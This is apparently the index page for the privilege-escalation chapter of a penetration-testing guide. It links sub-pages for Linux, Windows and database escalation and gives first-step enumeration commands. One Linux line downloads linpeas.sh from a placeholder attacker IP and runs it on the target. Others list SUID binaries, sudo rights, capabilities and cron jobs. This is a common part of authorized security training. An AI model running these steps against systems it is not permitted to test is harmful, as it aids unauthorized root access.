# ⬆️ Phase 7 — Privilege Escalation

> **Get from low-privilege user to root/SYSTEM.** This is often the most creative and time-consuming phase.

---

## Sub-Sections

| File | Contents |
|---|---|
| [01_linux_privesc.md](./01_linux_privesc.md) | Linux: SUID, sudo, cron, capabilities, PATH, kernel |
| [02_windows_privesc.md](./02_windows_privesc.md) | Windows: services, tokens, registry, Potato attacks |
| [03_database_privesc.md](./03_database_privesc.md) | MySQL, MSSQL, PostgreSQL privilege escalation |

---

## First Steps (Always)

**On Linux:**
```bash
# 1. Run automated enum first
wget http://<attacker_ip>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt

# 2. Quick manual checks
sudo -l                              # Sudo privileges
find / -perm -u=s -type f 2>/dev/null  # SUID files
getcap -r / 2>/dev/null              # Capabilities
crontab -l; cat /etc/crontab         # Cron jobs
```

**On Windows:**
```cmd
REM 1. Run automated enum
.\winPEAS.exe quiet
.\winPEAS.bat

REM 2. Quick checks
whoami /priv
whoami /groups
```

---

## Key Resources

- [GTFOBins](https://gtfobins.github.io) — Linux SUID/sudo/capability escape
- [LOLBAS](https://lolbas-project.github.io) — Windows binaries for PrivEsc
- [HackTricks — Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [HackTricks — Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

---

*[← Post-Exploitation](../06_post_exploitation/README.md) · [Back to Main](../README.md)*
